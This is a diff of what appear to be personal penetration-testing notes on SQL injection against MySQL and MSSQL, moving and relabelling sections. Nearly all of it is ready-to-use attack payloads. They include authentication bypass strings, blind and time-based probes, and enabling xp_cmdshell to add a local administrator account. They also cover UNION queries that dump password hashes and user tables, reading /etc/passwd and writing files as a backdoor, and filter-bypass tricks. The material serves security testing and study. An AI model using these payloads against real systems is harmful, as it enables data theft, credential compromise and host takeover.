@@ -3,9 +3,10 @@
 SQLI impact
     Bypass auth
     Dump DB
-    Find passwords, find reuse in SSH, etc
+    Find passwords, re-use in SSH, etc
     MySql: read sensitive files, write arbitrary files (backdoor).
     MsSql: Code execution
+    Run exploits for that db version
 
 Taxonomy
     Inband **error** based
@@ -44,7 +45,47 @@ or 1=1 --
     *' or ( 1=1 and username='admin');
 admin' --*
 
-MsSql Exploitation
+MsSqli exploitation
+    Find injectable parameter, doing do boolean based:
+    *1002' or '1'='1
+1002' and '1'='1
+1002' and '1'='2*
+
+    Find injectable parameter with time delays:
+    *XX'; WAITFOR DELAY '0:0:5'--*
+    If it works you can try to enable xp_cmdshell:
+    *EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;*
+
+    Test xp_cmdshell using a time delay:
+    *';exec master..xp_cmdshell 'ping -n 5 127.0.0.1'; --*
+
+    Add user
+    *';exec master..xp_cmdshell 'net user pwned 1234 /ADD && net localgroup administrators pwned /ADD'; --*
+
+    If it did not work, try enumerating the database. Find col until no error tells you the columns:
+    *1002' ORDER BY 1--
+1002' ORDER BY 2--
+1002' ORDER BY 3--*
+
+    Run union query with num of cols:
+    *1002' UNION ALL SELECT null,NULL,NULL,NULL--*
+
+    Get data:
+    *ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
+ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(HOST_NAME() AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
+ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(INJECTED_FUNCTION AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
+
+DB_NAME()
+user_name();
+system_user*
+
+    Get hashes
+    *1002' UNION ALL SELECT NULL,CHAR(113)+ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))+CHAR(98)+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS NVARCHAR(4000)),CHAR(32))+CHAR(113),NULL,NULL FROM master..sysxlogins--*
+
+MsSql error-based Exploitation
     Group by and **having** can be used to specify a search condition for a group and aggregate the result.
         Sending **' having 1=1--** should produce **column 'table.column1' is invalid**
         2. Sending **' group by table.column1 having 1=1--** should produce **column 'table.column2' is invalid**
@@ -71,7 +112,6 @@ and 1=2*
     *AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)=109*
     if it is true, we know the db_name starts with 109(m).
 
-MySql blind data exfiltration
     Ask if the first character of the user is 'a':
     *and if(substring (user(),1,1)=’a’,SLEEP(5),1)--”*
 
@@ -84,7 +124,7 @@ Finding number of columns using ORDER BY
     *vuln.php?id=1 order by 9 # This throws no error
 vuln.php?id=1 order by 10 # This throws error*
 
-MySql UNION based injection
+MySql UNION code execution
     Joins the result of two queries
         Two queries should return the same # of columns.
         Data-types in columns of the select must be of the same orcompatible type.
@@ -103,26 +143,8 @@ MySql UNION based injection
 1 union select 'foo' into outfile '/tmp/foo'
 1 union select load_file('/etc/passwd')*
 
-Leak database
-    Find databases
-    *SELECT schema_name FROM information_schema.schemata limit 1,2*
-Tricks to read data
-    Exfiltrate the different rows of the table. First, find the number of rows in the table:
-    *aa' UNION SELECT count(*), users.password FROM users; --*
 
-    Then select each row:
-    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1; --*
-    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 1; --*
-    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 2; --*
-
-
-    Exfiltrate the different rows of the table:
-        *' or 'x'='x' order by 1 desc --
-' or 'x'='x' order by 2 desc --
-...*
-
-
-Generic blind SQLI exploitation
+MySql UNION db leak
     First, identify vulnerable parameter by causing true and false conditions:
     *or 1=1 vs or 1=2
 and 1=2 vs and 1=1*
@@ -143,7 +165,6 @@ Table 'gallery.XXX' doesn't existCould not select category*
     Should produce:
     *You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '*47FB3B1E573D80F44CD198DC65DE7764795F948E) order by dateuploaded desc limit 1' at line 1*
 
-Mysql data exfiltration
     Find current user
     *SELECT user();
 SELECT system_user();*
@@ -158,6 +179,20 @@ SELECT distinct(db) FROM mysql.db*
     *SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
     List tables
     *SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
+
+    Exfiltrate the different rows of the table. First, find the number of rows in the table:
+    *aa' UNION SELECT count(*), users.password FROM users; --*
+
+    Then select each row:
+    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1; --*
+    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 1; --*
+    *aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 2; --*
+
+
+    Exfiltrate the different rows of the table:
+        *' or 'x'='x' order by 1 desc --
+' or 'x'='x' order by 2 desc --
+...*
 
 MySql in-band, union based SQLI exploitation
     Enumerate user
@@ -208,46 +243,9 @@ or true--
 ") or ("x")=("x
 ")) or (("x"))=(("x*
 
-Mssqli exploitation
-    Find injectable parameter, doing do boolean based:
-    *1002' or '1'='1
-1002' and '1'='1
-1002' and '1'='2*
-
-    Find injectable parameter with time delays:
-    *XX'; WAITFOR DELAY '0:0:5'--*
-    If it works you can try to enable xp_cmdshell:
-    *EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;*
-
-    Test xp_cmdshell using a time delay:
-    *';exec master..xp_cmdshell 'ping -n 5 127.0.0.1'; --*
-
-    Add user
-    *';exec master..xp_cmdshell 'net user pwned 1234 /ADD && net localgroup administrators pwned /ADD'; --*
-
-    If it did not work, try enumerating the database. Find col until no error tells you the columns:
-    *1002' ORDER BY 1--
-1002' ORDER BY 2--
-1002' ORDER BY 3--*
-
-    Run union query with num of cols:
-    *1002' UNION ALL SELECT null,NULL,NULL,NULL--*
-
-    Get data:
-    *ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(@@VERSION AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
-ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(HOST_NAME() AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
-ID=1002' UNION ALL SELECT NULL,+ISNULL(CAST(INJECTED_FUNCTION AS NVARCHAR(4000)),CHAR(32)),NULL,NULL--
-
-DB_NAME()
-user_name();
-system_user*
-
-    Get hashes
-    *1002' UNION ALL SELECT NULL,CHAR(113)+ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32))+CHAR(98)+ISNULL(CAST(master.dbo.fn_varbintohexstr(password) AS NVARCHAR(4000)),CHAR(32))+CHAR(113),NULL,NULL FROM master..sysxlogins--*
-
+Other tricks
+    If space is filtered, you can use /**/ instead
+    Sometimes you can bypassfilter by adding a new line; I.e. 123%0aor 1=1
 
 Object to relational mapping (ORM) injection
     Try vectors like
